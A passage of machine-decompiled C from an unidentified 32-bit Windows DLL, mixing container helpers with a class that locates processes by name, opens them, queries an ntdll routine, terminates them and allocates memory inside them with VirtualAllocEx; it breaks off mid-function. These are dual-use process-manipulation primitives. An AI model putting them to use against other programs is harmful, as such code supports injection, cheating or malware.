void *__thiscall sub_1001BE85(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  void *result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 16);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 16) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 20) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_1001BD7A(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (1001BF0D) --------------------------------------------------------
_DWORD *__thiscall sub_1001BF0D(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[4]; // [esp-18h] [ebp-30h] BYREF
  int v7; // [esp-8h] [ebp-20h]
  int v8; // [esp-4h] [ebp-1Ch]
  int *v9; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v11; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x18u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1001BF9A(v6, a2);
    LOBYTE(v11) = 0;
    result = sub_1001BFF7(Block, v6[0], v6[1], v6[2], v6[3], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 20) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (1001BF9A) --------------------------------------------------------
_DWORD *__stdcall sub_1001BF9A(_DWORD *a1, _DWORD *a2)
{
  *a1 = *a2;
  a1[1] = a2[1];
  sub_1000D372(a1 + 2, (int)(a2 + 2));
  return a1;
}

//----- (1001BFD7) --------------------------------------------------------
_DWORD *__thiscall sub_1001BFD7(_DWORD *Block, char a2)
{
  *Block = &off_10102C54;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10102C54: using guessed type int (__thiscall *off_10102C54)(void *Block, char);

//----- (1001BFF7) --------------------------------------------------------
_DWORD *__stdcall sub_1001BFF7(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  sub_1001BF9A(a1, &a2);
  a1[4] = a6;
  a1[5] = a7;
  sub_1001BDAA((int)&a2);
  return a1;
}

//----- (1001C041) --------------------------------------------------------
int __stdcall sub_1001C041(int a1)
{
  sub_1001C616();
  return a1;
}

//----- (1001C050) --------------------------------------------------------
int *__thiscall sub_1001C050(int *this, int *a2)
{
  void (__thiscall ***v3)(_DWORD, int); // ecx
  int v4; // ebx
  int v5; // eax
  int v6; // eax

  if ( a2 != this )
  {
    v3 = (void (__thiscall ***)(_DWORD, int))this[3];
    if ( v3 )
    {
      if ( *(v3 - 1) )
        (**v3)(v3, 3);
      else
        j__free(v3 - 1);
    }
    this[2] = 1;
    v4 = *this;
    v5 = (*(int (__thiscall **)(int *))(*a2 + 4))(a2);
    v6 = (*(int (__thiscall **)(int *, int, int))(*a2 + 4))(a2, a2[3], v5);
    (*(void (__thiscall **)(int *, int))(v4 + 84))(this, v6);
  }
  return this;
}

//----- (1001C0A7) --------------------------------------------------------
void *__thiscall sub_1001C0A7(_DWORD *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  *this = &off_10102BB0;
  v5 = 1;
  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  this[3] = 0;
  v5 = -1;
  return sub_100185A9(this);
}
// 10102BB0: using guessed type int (__thiscall *off_10102BB0)(void *Block, char);

//----- (1001C119) --------------------------------------------------------
void __thiscall sub_1001C119(_DWORD *this, int a2, unsigned int a3)
{
  DWORD v5; // eax
  int v6; // esi
  int v7; // eax
  unsigned int v8; // eax
  int v9; // esi
  DWORD CurrentProcessId; // [esp-4h] [ebp-28h]
  int (__thiscall **v11)(void *, char); // [esp+Ch] [ebp-18h] BYREF
  char v12[8]; // [esp+10h] [ebp-14h] BYREF
  int v13; // [esp+20h] [ebp-4h]
  int v14; // [esp+30h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1013E76E);
  v11 = &off_10102B8C;
  CurrentProcessId = GetCurrentProcessId();
  v5 = GetCurrentProcessId();
  sub_10011AF4((int)v12, (void *)0xFFFFFFFF, 0, 0, v5, CurrentProcessId);
  v13 = 0;
  sub_1001B63C(a2, (int)&v11);
  v13 = 1;
  v6 = *this;
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v6 + 60))(this, v7 + 1);
  v8 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( v8 > a3 )
  {
    v9 = 12 * v8;
    v14 = v8 - a3;
    do
    {
      sub_1001B666(this[3] + v9 - 12, this[3] + v9);
      v9 -= 12;
      --v14;
    }
    while ( v14 );
  }
  sub_1001B666((int)&v11, this[3] + 12 * a3);
  ++this[1];
  v13 = -1;
  sub_1001B56C(&v11);
}
// 10102B8C: using guessed type int (__thiscall *off_10102B8C)(void *, char);
// 1001C119: using guessed type char var_14[8];

//----- (1001C1E5) --------------------------------------------------------
int __thiscall sub_1001C1E5(_DWORD *this, unsigned int a2)
{
  int v3; // eax
  unsigned int v4; // ebx
  int v5; // edi
  int v6; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013E76F);
  v3 = *this;
  --this[1];
  v4 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(v3 + 4))(this) )
  {
    v5 = 12 * a2;
    do
    {
      sub_1001B666(this[3] + v5 + 12, this[3] + v5);
      ++v4;
      v5 += 12;
    }
    while ( v4 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  sub_1001B666((int)&unk_10193C3C, this[3] + 12 * v6);
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1001C252) --------------------------------------------------------
int __thiscall sub_1001C252(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013E876);
  return this[3] + 12 * a2;
}

//----- (1001C273) --------------------------------------------------------
int __thiscall sub_1001C273(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1013E877);
  return this[3] + 12 * a2;
}

//----- (1001C294) --------------------------------------------------------
void __thiscall sub_1001C294(_DWORD *this, unsigned int a2)
{
  void (__thiscall ***v2)(_DWORD, int); // esi

  if ( this[2] < a2 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void (__thiscall ***)(_DWORD, int), unsigned int))(*this + 84))(
      this,
      this[1],
      v2,
      a2);
    if ( v2 )
    {
      if ( *(v2 - 1) )
        (**v2)(v2, 3);
      else
        j__free(v2 - 1);
    }
  }
}

//----- (1001C2CF) --------------------------------------------------------
int __thiscall sub_1001C2CF(int *this)
{
  void (__thiscall ***v2)(_DWORD, int); // ecx
  int v3; // edx
  int result; // eax

  v2 = (void (__thiscall ***)(_DWORD, int))this[3];
  if ( v2 )
  {
    if ( *(v2 - 1) )
      (**v2)(v2, 3);
    else
      j__free(v2 - 1);
  }
  v3 = *this;
  this[2] = 1;
  result = (*(int (__thiscall **)(int *, _DWORD, _DWORD, int))(v3 + 84))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (1001C308) --------------------------------------------------------
int __thiscall sub_1001C308(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // ebx
  int v4; // edi
  int v5; // eax

  v2 = a2;
  if ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    v4 = 12 * a2;
    do
    {
      sub_1001B666((int)&unk_10193C3C, v4 + this[3]);
      ++a2;
      v4 += 12;
    }
    while ( a2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
  }
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, v2);
  v5 = *this;
  this[1] = v2;
  return (*(int (__thiscall **)(_DWORD *))(v5 + 88))(this);
}

//----- (1001C35F) --------------------------------------------------------
unsigned int __thiscall sub_1001C35F(_DWORD *this, unsigned int a2, int *a3, int *a4)
{
  unsigned int result; // eax
  int v8; // eax
  int *v9; // ecx
  int v10; // [esp+18h] [ebp+Ch]
  unsigned int v11; // [esp+1Ch] [ebp+10h]

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1013E8BE);
  (*(void (__thiscall **)(int *, unsigned int))(*a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int *, unsigned int))(*a4 + 60))(a4, this[1] - a2);
  v11 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    v10 = 0;
    do
    {
      if ( v11 >= a2 )
      {
        v8 = *a4;
        v9 = a4;
      }
      else
      {
        v8 = *a3;
        v9 = a3;
      }
      (*(void (__thiscall **)(int *, int))(v8 + 36))(v9, v10 + this[3]);
      ++v11;
      v10 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v11 < result );
  }
  return result;
}

//----- (1001C3DB) --------------------------------------------------------
unsigned int __thiscall sub_1001C3DB(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // edi
  int v6; // ecx
  int *v7; // eax
  _DWORD *v8; // ebx
  int v9; // eax
  unsigned int v10; // ebx
  unsigned int result; // eax
  int v12; // edi

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  v6 = (12 * (unsigned __int64)(unsigned int)v5) >> 32 != 0 ? -1 : 12 * v5;
  v7 = (int *)operator new(__CFADD__(v6, 4) ? -1 : v6 + 4);
  v8 = 0;
  if ( v7 )
  {
    v8 = v7 + 1;
    *v7 = v5;
    `eh vector constructor iterator'(
      v7 + 1,
      0xCu,
      v5,
      (void (__thiscall *)(void *))sub_1001B4E0,
      (void (__thiscall *)(void *))sub_1001B56C);
  }
  this[1] = a2;
  v9 = *this;
  this[3] = v8;
  v10 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(v9 + 4))(this);
  if ( result )
  {
    v12 = 0;
    do
    {
      sub_1001B666(v12 + a3, v12 + this[3]);
      ++v10;
      v12 += 12;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v10 < result );
  }
  return result;
}

//----- (1001C48B) --------------------------------------------------------
void *__thiscall sub_1001C48B(_DWORD *this)
{
  void *result; // eax
  int v3; // edi
  int v4; // eax
  int v5; // edi
  int v6; // eax
  char *v7; // ebx
  int v8; // ecx
  int *v9; // eax
  _DWORD *v10; // edi
  int v11; // edi
  char *i; // eax
  unsigned int v13; // [esp+Ch] [ebp-18h]
  int v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]

  result = &loc_100A3A0A;
  if ( this[2] > 0x10u )
  {
    result = (void *)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this));
    if ( (unsigned int)result <= this[2] )
    {
      v3 = *this;
      v4 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v3 + 80))(this, 1, v4) <= 0x10 )
      {
        v14 = 16;
      }
      else
      {
        v5 = *this;
        v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
        v14 = (*(int (__thiscall **)(_DWORD *, int, int))(v5 + 80))(this, 1, v6);
      }
      v7 = (char *)this[3];
      v8 = (12 * (unsigned __int64)(unsigned int)v14) >> 32 != 0 ? -1 : 12 * v14;
      v9 = (int *)operator new(__CFADD__(v8, 4) ? -1 : v8 + 4);
      if ( v9 )
      {
        v10 = v9 + 1;
        *v9 = v14;
        `eh vector constructor iterator'(
          v9 + 1,
          0xCu,
          v14,
          (void (__thiscall *)(void *))sub_1001B4E0,
          (void (__thiscall *)(void *))sub_1001B56C);
        v15 = (int)v10;
      }
      else
      {
        v15 = 0;
      }
      v13 = 0;
      if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
      {
        v11 = v15;
        for ( i = &v7[-v15]; ; i = &v7[-v15] )
        {
          sub_1001B666((int)&i[v11], v11);
          ++v13;
          v11 += 12;
          if ( v13 >= (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
            break;
        }
      }
      this[3] = v15;
      if ( v7 )
      {
        if ( *((_DWORD *)v7 - 1) )
          (**(void (__thiscall ***)(char *, int))v7)(v7, 3);
        else
          j__free(v7 - 4);
      }
      result = (void *)v14;
      this[2] = v14;
    }
  }
  return result;
}

//----- (1001C5AD) --------------------------------------------------------
_DWORD *__thiscall sub_1001C5AD(_DWORD *Block, char a2)
{
  sub_1001C0A7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C5CC) --------------------------------------------------------
char *__thiscall sub_1001C5CC(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0xCu, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_1001B56C);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_1001B56C(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (1001C616) --------------------------------------------------------
int sub_1001C616()
{
  int v0; // ecx
  int result; // eax
  _DWORD *v2; // eax
  _DWORD *v3; // esi
  int v4; // ecx
  _DWORD *v5[2]; // [esp+0h] [ebp-18h] BYREF
  void *Block; // [esp+8h] [ebp-10h] BYREF
  int v7; // [esp+14h] [ebp-4h]

  v0 = dword_1017E02C;
  result = _InterlockedExchange((volatile __int32 *)&Block, (__int32)&loc_100A6045);
  if ( !v0 )
  {
    sub_1000EDE4(dword_10193C48, v5);
    v7 = 0;
    if ( !dword_1017E02C )
    {
      v2 = operator new(8u);
      v3 = v2;
      Block = v2;
      LOBYTE(v7) = 1;
      if ( v2 )
      {
        v2 = sub_10050B91(v2, 0);
        LOBYTE(v7) = 1;
        v4 = (int)v3;
      }
      else
      {
        v4 = 0;
      }
      LOBYTE(v7) = 0;
      _InterlockedExchange((volatile __int32 *)&Block, (__int32)v2);
      dword_1017E02C = v4;
      dword_101835F8 = v4;
    }
    v7 = -1;
    return sub_1000EDA4(v5);
  }
  return result;
}
// 1017E02C: using guessed type int dword_1017E02C;
// 101835F8: using guessed type int dword_101835F8;
// 10193C48: using guessed type int dword_10193C48[9];

//----- (1001C69F) --------------------------------------------------------
void __usercall sub_1001C69F(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0xC4u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0xCu,
      16,
      (void (__thiscall *)(void *))sub_1001B4E0,
      (void (__thiscall *)(void *))sub_1001B56C);
  }
  a1[3] = v1;
}

//----- (1001C711) --------------------------------------------------------
struct _FILETIME sub_1001C711()
{
  _DWORD *v0; // eax
  struct _SYSTEMTIME SystemTime; // [esp+4h] [ebp-34h] BYREF
  int v3[3]; // [esp+14h] [ebp-24h] BYREF
  struct _FILETIME FileTime; // [esp+20h] [ebp-18h] BYREF
  int v5; // [esp+34h] [ebp-4h]

  GetSystemTime(&SystemTime);
  if ( !SystemTimeToFileTime(&SystemTime, &FileTime) )
  {
    v0 = sub_1000E9DF(v3, 1, 1);
    v5 = 0;
    sub_1000A947(v0, 14);
  }
  return FileTime;
}
// 1001C711: using guessed type int var_24[3];

//----- (1001C764) --------------------------------------------------------
int sub_1001C764()
{
  return *(__int64 *)&sub_1001C711() / 10000 / 1000 + 1240428288;
}

//----- (1001C78D) --------------------------------------------------------
int __usercall sub_1001C78D@<eax>(_DWORD *a1@<esi>)
{
  if ( a1[2] == -1 )
    a1[2] = (*(int (__thiscall **)(_DWORD *))(*a1 + 24))(a1);
  return a1[2];
}

//----- (1001C7A1) --------------------------------------------------------
_DWORD *__stdcall sub_1001C7A1(_DWORD *a1, void *a2, char a3)
{
  sub_100125C6(a1, a2, a3);
  *a1 = &off_10102C78;
  return a1;
}
// 10102C78: using guessed type int (__thiscall *off_10102C78)(void *Block, char);

//----- (1001C7DA) --------------------------------------------------------
int *__thiscall sub_1001C7DA(int *Block, char a2)
{
  sub_100128CB(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C7FA) --------------------------------------------------------
_DWORD *__cdecl sub_1001C7FA(_DWORD *a1)
{
  HANDLE CurrentProcess; // eax

  CurrentProcess = GetCurrentProcess();
  sub_1001C7A1(a1, CurrentProcess, 1);
  return a1;
}

//----- (1001C834) --------------------------------------------------------
int __thiscall sub_1001C834(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_1001C78D(this);
  sub_100225E5(a2, v2);
  return a2;
}

//----- (1001C871) --------------------------------------------------------
int __cdecl sub_1001C871(int a1)
{
  int v1; // ecx
  int result; // eax
  _DWORD *v3; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = v1;
  result = sub_1001C8B1(a1);
  if ( result == -1 )
  {
    v3 = sub_1000E7F7(v4, 1, 0);
    v4[3] = 0;
    sub_10007882((int)v3);
  }
  return result;
}
// 1001C87B: variable 'v1' is possibly undefined

//----- (1001C8B1) --------------------------------------------------------
int __cdecl sub_1001C8B1(int a1)
{
  int v1; // ecx
  int v2; // edi
  _DWORD *v3; // eax
  int v4; // eax
  _DWORD *v5; // eax
  bool v6; // bl
  int v7; // ecx
  DWORD v8; // esi
  DWORD v9; // eax
  int v11; // [esp-4h] [ebp-54h]
  int v12; // [esp+10h] [ebp-40h]
  void *v13[2]; // [esp+14h] [ebp-3Ch] BYREF
  int v14[2]; // [esp+1Ch] [ebp-34h] BYREF
  int v15[3]; // [esp+24h] [ebp-2Ch] BYREF
  _DWORD v16[5]; // [esp+30h] [ebp-20h] BYREF
  int v17; // [esp+4Ch] [ebp-4h]

  v12 = -1;
  v2 = v1;
  sub_1000D372(v14, a1);
  v17 = 0;
  if ( v2 == -1 )
  {
    v3 = sub_1001C7FA(v15);
    LOBYTE(v17) = 1;
    v2 = (*(int (__thiscall **)(_DWORD *))(*v3 + 36))(v3);
    LOBYTE(v17) = 0;
    sub_100128CB(v15);
  }
  sub_10020F2E(v16);
  LOBYTE(v17) = 2;
  sub_10056FB7(v16, (int)v13);
  LOBYTE(v17) = 3;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v13[0] + 4))(v13[0]) )
  {
    v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)v13[0] + 12))(v13[0]);
    v5 = sub_10020EF4(v4, v15);
    LOBYTE(v17) = 4;
    v6 = sub_1000DE70((int)v5, (int)v14);
    LOBYTE(v17) = 3;
    sub_1000D3AD(v15);
    if ( v6 )
    {
      v8 = *(_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v13[0] + 12))(v13[0]);
      v9 = sub_1002110D(v8);
      v7 = v11;
      if ( v2 == v9 )
      {
        if ( v12 != -1 )
        {
          v12 = -1;
          break;
        }
        v12 = v8;
      }
    }
    sub_10021F56(v7, (int)v13[0]);
  }
  LOBYTE(v17) = 2;
  sub_1002228F(v13);
  LOBYTE(v17) = 0;
  sub_1001BB30(v16);
  v17 = -1;
  sub_1000D3AD(v14);
  return v12;
}
// 1001C8DF: variable 'v1' is possibly undefined
// 1001C986: variable 'v11' is possibly undefined
// 1001C998: variable 'v7' is possibly undefined
// 1001C8B1: using guessed type int var_2C[3];
// 1001C8B1: using guessed type _DWORD var_20[5];

//----- (1001C9F1) --------------------------------------------------------
_DWORD *__cdecl sub_1001C9F1(_DWORD *a1)
{
  int v1; // eax

  v1 = sub_1001C871((int)&unk_10186A38);
  sub_1001CA35(v1, a1, 0x40u);
  return a1;
}

//----- (1001CA35) --------------------------------------------------------
_DWORD *__usercall sub_1001CA35@<eax>(DWORD a1@<ebx>, _DWORD *a2, DWORD dwDesiredAccess)
{
  HANDLE v3; // eax
  _DWORD *v4; // eax
  _DWORD v6[4]; // [esp+8h] [ebp-1Ch] BYREF
  int v7; // [esp+20h] [ebp-4h]

  v7 = 0;
  v6[3] = 0;
  v3 = OpenProcess(dwDesiredAccess, 0, a1);
  if ( !v3 )
  {
    v4 = sub_1000E9DF(v6, 1, 1);
    v7 = 1;
    sub_1000A947(v4, 261);
  }
  sub_1001C7A1(a2, v3, 0);
  a2[2] = a1;
  return a2;
}

//----- (1001CA9C) --------------------------------------------------------
_DWORD *__userpurge sub_1001CA9C@<eax>(int a1@<edi>, _DWORD *a2)
{
  sub_10012A51(a1, a2);
  *a2 = &off_10102C78;
  return a2;
}
// 10102C78: using guessed type int (__thiscall *off_10102C78)(void *Block, char);

//----- (1001CACF) --------------------------------------------------------
DWORD __thiscall sub_1001CACF(_DWORD *this)
{
  _DWORD *v2; // eax
  int v3; // eax
  _DWORD *v4; // eax
  int v6[3]; // [esp+4h] [ebp-20h] BYREF
  int v7; // [esp+10h] [ebp-14h] BYREF
  DWORD ExitCode; // [esp+14h] [ebp-10h] BYREF
  int v9; // [esp+20h] [ebp-4h]

  if ( !sub_1001303A((int)this) )
  {
    v2 = sub_1000E7F7(&v7, 1, 0);
    v9 = 0;
    sub_10007882((int)v2);
  }
  v3 = this[1];
  ExitCode = 0;
  if ( !GetExitCodeProcess(*(HANDLE *)(v3 + 16), &ExitCode) )
  {
    v4 = sub_1000E9DF(v6, 1, 1);
    v9 = 1;
    sub_1000A947(v4, 291);
  }
  return ExitCode;
}
// 1001CACF: using guessed type int var_20[3];

//----- (1001CB48) --------------------------------------------------------
int __thiscall sub_1001CB48(_DWORD *this)
{
  wchar_t *v2; // eax
  int v3; // ecx
  int v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp+10h] [ebp-48h] BYREF
  void *v8[5]; // [esp+14h] [ebp-44h] BYREF
  int v9[2]; // [esp+28h] [ebp-30h] BYREF
  int v10[7]; // [esp+30h] [ebp-28h] BYREF
  int v11; // [esp+54h] [ebp-4h]

  if ( (dword_10193B20 & 1) == 0 )
  {
    dword_10193B20 |= 1u;
    v11 = 0;
    sub_1000D17D(v9, aNtdllDll_1);
    LOBYTE(v11) = 1;
    v2 = (wchar_t *)sub_1000CC40((int)&unk_10179658);
    v7 = v3;
    v8[4] = &v7;
    sub_1000D17D(&v7, v2);
    LOBYTE(v11) = 1;
    dword_101832A0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_1001E665((int)v9);
    LOBYTE(v11) = 0;
    sub_1000D3AD(v9);
    v11 = -1;
  }
  memset(v10, 0, 0x18u);
  if ( dword_101832A0(*(_DWORD *)(this[1] + 16), 0, v10, 24, 0) < 0 )
  {
    v4 = dword_101832A0(*(_DWORD *)(this[1] + 16), 0, v10, 24, 0);
    v5 = sub_10050D97(v8, v4);
    v10[4] = 3;
    sub_10015338((int)v5, 305);
  }
  return v10[4];
}
// 1001CB9E: variable 'v3' is possibly undefined
// 101832A0: using guessed type int (__stdcall *dword_101832A0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10193B20: using guessed type int dword_10193B20;

//----- (1001CC4D) --------------------------------------------------------
bool __thiscall sub_1001CC4D(_DWORD *this, UINT uExitCode)
{
  BOOL v3; // eax
  _DWORD *v4; // eax
  _DWORD v6[6]; // [esp+4h] [ebp-18h] BYREF

  LOBYTE(v3) = sub_1001303A((int)this);
  if ( !v3 )
  {
    v3 = TerminateProcess(*(HANDLE *)(this[1] + 16), uExitCode);
    if ( !v3 )
    {
      v4 = sub_1000E9DF(v6, 1, 1);
      v6[5] = 0;
      sub_1000A947(v4, 312);
    }
  }
  return v3;
}

//----- (1001CCA5) --------------------------------------------------------
_DWORD *__thiscall sub_1001CCA5(_DWORD *this, _DWORD *a2, DWORD a3)
{
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v6; // eax
  int v8[3]; // [esp+Ch] [ebp-24h] BYREF
  unsigned int v9; // [esp+18h] [ebp-18h]
  int v10; // [esp+1Ch] [ebp-14h]
  int v11; // [esp+20h] [ebp-10h]
  int v12; // [esp+2Ch] [ebp-4h]

  v10 = 0;
  v11 = sub_1001C78D(this);
  sub_10020F2E(v8);
  v12 = 1;
  v3 = 0;
  if ( !v9 )
  {
LABEL_4:
    v5 = sub_1000E7F7(&a3, 1, 0);
    LOBYTE(v12) = 2;
    sub_10007882((int)v5);
  }
  while ( 1 )
  {
    v4 = (_DWORD *)(*(int (__thiscall **)(int *, int))(v8[0] + 44))(v8, v3);
    if ( *v4 == v11 )
      break;
    if ( ++v3 >= v9 )
      goto LABEL_4;
  }
  v6 = (*(int (__thiscall **)(int *, int))(v8[0] + 44))(v8, v3);
  sub_1001CA35(*(_DWORD *)(v6 + 4), a2, a3);
  v10 = 1;
  LOBYTE(v12) = 0;
  sub_1001BB30(v8);
  return a2;
}

//----- (1001CD4A) --------------------------------------------------------
_DWORD *__thiscall sub_1001CD4A(_DWORD *this, _DWORD *a2)
{
  int v3; // edi
  int v4; // eax
  _DWORD *v5; // eax
  int v7; // [esp+0h] [ebp-38h] BYREF
  int v8[3]; // [esp+Ch] [ebp-2Ch] BYREF
  int v9[3]; // [esp+18h] [ebp-20h] BYREF
  int v10; // [esp+24h] [ebp-14h]
  int *v11; // [esp+28h] [ebp-10h]
  int v12; // [esp+34h] [ebp-4h]

  v11 = &v7;
  v9[2] = (int)this;
  v10 = 0;
  v12 = 1;
  sub_1000D1D6(v9, 0x104u);
  LOBYTE(v12) = 2;
  v3 = *(_DWORD *)(this[1] + 16);
  v4 = sub_1000D679(v9);
  if ( !GetModuleBaseNameW(v3, 0, v4, 260) )
  {
    v5 = sub_1000E9DF(v8, 1, 1);
    LOBYTE(v12) = 3;
    sub_1000A947(v5, 328);
  }
  sub_1000D6AC((int)v9);
  sub_1000D372(a2, (int)v9);
  v10 = 1;
  LOBYTE(v12) = 1;
  sub_1000D3AD(v9);
  return a2;
}
// 1009E6F3: using guessed type int __stdcall GetModuleBaseNameW(_DWORD, _DWORD, _DWORD, _DWORD);
// 1001CD4A: using guessed type int var_2C[3];

//----- (1001CE3D) --------------------------------------------------------
int __thiscall sub_1001CE3D(void *this, int a2, int a3, int a4)
{
  sub_1001FA9F(a3, (int)this, a2, a4);
  return a2;
}

//----- (1001CE7A) --------------------------------------------------------
int __thiscall sub_1001CE7A(_DWORD *this, int a2, SIZE_T dwSize, DWORD flProtect, DWORD flAllocationType)
{
  _DWORD *v6; // eax
  int v8[3]; // [esp+Ch] [ebp-2Ch] BYREF
  _DWORD v9[3]; // [esp+18h] [ebp-20h] BYREF
  int v10; // [esp+24h] [ebp-14h]
  int v11; // [esp+28h] [ebp-10h] BYREF
  int v12; // [esp+34h] [ebp-4h]
  LPVOID flProtecta; // [esp+48h] [ebp+10h]

  v10 = 0;
  v11 = 128;
  sub_100219DF(&v11, (int)v9);
  v12 = 1;
  flProtecta = VirtualAllocEx(*(HANDLE *)(this[1] + 16), 0, dwSize, flAllocationType, flProtect);
  sub_10021A37((int)v9);
  if ( !flProtecta )
  {
    v6 = sub_1000E9DF(v8, 1, 1);
    LOBYTE(v12) = 2;
    sub_1000A947(v6, 353);
  }
  sub_1001FA9F((int)flProtecta, (int)this, a2, dwSize);
  v10 = 1;
  LOBYTE(v12) = 0;
  sub_10021A57(v9);
  return a2;
}
// 1001CE7A: using guessed type _DWORD var_20[3];
// 1001CE7A: using guessed type int var_2C[3];

//----- (1001CF16) --------------------------------------------------------
int __thiscall sub_1001CF16(void *this, int a2, char a3, char a4, char a5)
{
  *(_DWORD *)(a2 + 8) = 0;
  *(_BYTE *)(a2 + 4) = a3;
  *(_BYTE *)(a2 + 5) = a4;
  *(_BYTE *)(a2 + 6) = a5;
  *(_DWORD *)a2 = off_10102F98;
  *(_BYTE *)(a2 + 7) = 0;
  sub_1001CA9C((int)this, (_DWORD *)(a2 + 12));
  sub_1001FB4A(a2 + 24);
  sub_100228A0(a2);
  return a2;
}
// 10102F98: using guessed type int (__thiscall *off_10102F98[2])(void *Block, char);

//----- (1001CF87) --------------------------------------------------------
char __thiscall sub_1001CF87(void *this, int *a2)
{
  int v2; // esi
  _DWORD *v3; // eax
  bool v4; // bl
